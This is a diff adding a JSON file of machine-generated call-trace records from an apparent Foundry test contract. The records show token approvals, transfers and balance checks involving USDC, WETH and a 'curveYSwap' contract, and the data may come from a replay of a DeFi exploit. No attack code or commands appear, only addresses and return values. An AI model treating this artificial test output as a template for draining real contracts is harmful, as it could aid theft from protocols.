+        "args": "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 13804947768087488 [1.38e16], 1820393572179453153354 [1.82e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000000000000000bbde"
+    },
+    {
+        "id": "509",
+        "args": "0x83f798e925BcD4017Eb265844FDDAbb448f1707D",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "3780",
+        "args": "0x83f798e925BcD4017Eb265844FDDAbb448f1707D",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "2257",
+        "args": "0x70a0823100000000000000000000000083f798e925bcd4017eb265844fddabb448f1707d",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "600",
+        "args": "0x83f798e925BcD4017Eb265844FDDAbb448f1707D",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "95099",
+        "args": "184047583437 [1.84e11]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "1315",
+        "args": "0xd6aD7a6750A7593E092a9B218d66C0A814a3436e",
+        "original_code": null,
+        "description": null,
+        "return_value": "361371093359 [3.613e11]"
+    },
+    {
+        "id": "529",
+        "args": "0xd6aD7a6750A7593E092a9B218d66C0A814a3436e",
+        "original_code": null,
+        "description": null,
+        "return_value": "361371093359 [3.613e11]"
+    },
+    {
+        "id": "6496",
+        "args": "0xd6aD7a6750A7593E092a9B218d66C0A814a3436e",
+        "original_code": null,
+        "description": null,
+        "return_value": "355746811772 [3.557e11]"
+    },
+    {
+        "id": "3312",
+        "args": "USDC: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000003a9378a67805bd063f7d4f6"
+    },
+    {
+        "id": "2569",
+        "args": "USDC: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000003a9378a67805bd063f7d4f6"
+    },
+    {
+        "id": "15172",
+        "args": "(0xd6aD7a6750A7593E092a9B218d66C0A814a3436e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "2111",
+        "args": "USDC: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], 2101112444 [2.101e9], 815523071572 [8.155e11]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000f951d4"
+    },
+    {
+        "id": "509",
+        "args": "0xd6aD7a6750A7593E092a9B218d66C0A814a3436e",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "553",
+        "args": "0xd6aD7a6750A7593E092a9B218d66C0A814a3436e",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "1315",
+        "args": "0xd6aD7a6750A7593E092a9B218d66C0A814a3436e",
+        "original_code": null,
+        "description": null,
+        "return_value": "361371093359 [3.613e11]"
+    },
+    {
+        "id": "529",
+        "args": "0xd6aD7a6750A7593E092a9B218d66C0A814a3436e",
+        "original_code": null,
+        "description": null,
+        "return_value": "361371093359 [3.613e11]"
+    },
+    {
+        "id": "24717",
+        "args": "curveYSwap: [0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51], 231512390369 [2.315e11]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "23928",
+        "args": "curveYSwap: [0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51], 231512390369 [2.315e11]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "1315",
+        "args": "0xd6aD7a6750A7593E092a9B218d66C0A814a3436e",
+        "original_code": null,
+        "description": null,
+        "return_value": "129858702990 [1.298e11]"
+    },
+    {
+        "id": "529",
+        "args": "0xd6aD7a6750A7593E092a9B218d66C0A814a3436e",
+        "original_code": null,
+        "description": null,
+        "return_value": "129858702990 [1.298e11]"
+    },
+    {
+        "id": "6496",
+        "args": "0xd6aD7a6750A7593E092a9B218d66C0A814a3436e",
+        "original_code": null,
+        "description": null,
+        "return_value": "355746811772 [3.557e11]"
+    },
+    {
+        "id": "3312",
+        "args": "USDC: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000003a9378a67805bd063f7d4f6"
+    },
+    {
+        "id": "2569",
+        "args": "USDC: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000003a9378a67805bd063f7d4f6"
+    },
+    {
+        "id": "15172",
+        "args": "(0xd6aD7a6750A7593E092a9B218d66C0A814a3436e, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "2111",
+        "args": "USDC: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], 2101112444 [2.101e9], 815523071572 [8.155e11]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000f951d4"
+    },
+    {
+        "id": "509",
+        "args": "0xd6aD7a6750A7593E092a9B218d66C0A814a3436e",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "553",
+        "args": "0xd6aD7a6750A7593E092a9B218d66C0A814a3436e",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "1315",
+        "args": "curveYSwap: [0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51]",
+        "original_code": null,
+        "description": null,
+        "return_value": "231512390369 [2.315e11]"
+    },
+    {
+        "id": "529",
+        "args": "curveYSwap: [0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51]",
+        "original_code": null,
+        "description": null,
+        "return_value": "231512390369 [2.315e11]"
+    },
+    {
+        "id": "24717",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 231512390369 [2.315e11]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "23928",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 231512390369 [2.315e11]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "4817",
+        "args": "0x5777d92f208679DB4b9778590Fa3CAB3aC9e2168, 120012000000 [1.2e11]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "4028",
+        "args": "0x5777d92f208679DB4b9778590Fa3CAB3aC9e2168, 120012000000 [1.2e11]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "602",
+        "args": "0x5777d92f208679DB4b9778590Fa3CAB3aC9e2168",
+        "original_code": null,
+        "description": null,
+        "return_value": "55714108890776239216744060 [5.571e25]"
+    },
+    {
+        "id": "1315",
+        "args": "0x5777d92f208679DB4b9778590Fa3CAB3aC9e2168",
+        "original_code": null,
+        "description": null,
+        "return_value": "52228726641586 [5.222e13]"
+    },
+    {
+        "id": "529",
+        "args": "0x5777d92f208679DB4b9778590Fa3CAB3aC9e2168",
+        "original_code": null,
+        "description": null,
+        "return_value": "52228726641586 [5.222e13]"
+    },
+    {
+        "id": "1315",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "111500390369 [1.115e11]"
+    },
+    {
+        "id": "529",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "111500390369 [1.115e11]"
+    },
+    {
+        "id": "3164",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "6"
+    },
+    {
+        "id": "2381",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "6"
+    }
+]
